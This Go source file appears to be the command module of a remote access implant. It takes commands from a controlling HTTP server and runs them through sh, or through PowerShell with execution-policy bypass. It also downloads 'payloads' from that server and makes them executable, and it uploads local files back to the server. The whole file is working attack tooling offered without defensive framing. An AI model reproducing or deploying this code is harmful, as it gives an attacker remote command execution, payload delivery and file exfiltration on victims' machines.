package commands

import (
	"fmt"
	"os"
	"runtime"
	"path/filepath"
	"net/http"
	"io"
	"os/exec"
	"strings"
	"bytes"
	"mime/multipart"
 )

 //RunCommand executes a given command
 func RunCommand(message string, httpServer string) ([]byte, int) {
   if strings.HasPrefix(message, "cd") {
      pieces := strings.Split(message, "cd")
      bites := changeDirectory(pieces[1])
      return bites, 0
   } else if (strings.HasPrefix(message, "download")) {
      pieces := strings.Split(message, "download")
      go download(httpServer, pieces[1])
      return []byte("Download initiated\n"), 0
   } else if (strings.HasPrefix(message, "upload")) {
      pieces := strings.Split(message, "upload")
      go upload(httpServer, pieces[1])
      return []byte("Upload initiated\n"), 0
   } else {
      bites, status := execute(message)
      return bites, status
   }
}

 func execute(command string) ([]byte, int) {
	var bites []byte
	var error error
	var status int
	if runtime.GOOS == "windows" {
	   bites, error = exec.Command("powershell.exe", "-ExecutionPolicy", "Bypass", "-C", command).Output()
	} else {
	   bites, error = exec.Command("sh", "-c", command).Output()
    }
    if error != nil {
	   bites = []byte(string(error.Error()))
	   status = 1
	}
	return []byte(fmt.Sprintf("%s%s", bites, "\n")), status
}

func changeDirectory(target string) []byte {
	os.Chdir(strings.TrimSpace(target))
	return []byte(" ")
}

func download(server string, file string) []byte {
	file = strings.TrimSpace(file)
	cwd, _ := os.Getwd()
	location := filepath.Join(cwd, file)
	
    if len(file) > 0 {
       fmt.Println(fmt.Sprintf("[*] Downloading new payload: %s", file))
       address := fmt.Sprintf("%s/file/download", server)
       req, _ := http.NewRequest("POST", address, nil)
       req.Header.Set("file", file)
	   req.Header.Set("platform", string(runtime.GOOS))
       client := &http.Client{}
       resp, err := client.Do(req)
       if err == nil {
          dst, _ := os.Create(location)
          defer dst.Close()
		  io.Copy(dst, resp.Body)
		  os.Chmod(location, 777)
       }
	}
	return []byte(" ")
}

func upload(server string, file string) []byte {
	file = strings.TrimSpace(file)
	fmt.Println(fmt.Sprintf("[*] Uploading file %s", file))
	address := fmt.Sprintf("%s/file/upload", server)

	bodyBuf := &bytes.Buffer{}
    bodyWriter := multipart.NewWriter(bodyBuf)

    fileWriter, _ := bodyWriter.CreateFormFile("file", file)
    handler, err := os.Open(file)
    if err != nil {
		fmt.Println("Error opening file")
		return []byte(" ")
    }
    defer handler.Close()
    io.Copy(fileWriter, handler)
    contentType := bodyWriter.FormDataContentType()
    bodyWriter.Close()

	req, _ := http.NewRequest("POST", address, bodyBuf)
	req.Header.Set("Content-Type", contentType)
	client := &http.Client{}
	resp, err := client.Do(req)

	if err != nil {
		fmt.Println("Error making request")
		return []byte(" ")
	}
    resp.Body.Close()
    return []byte(" ")
}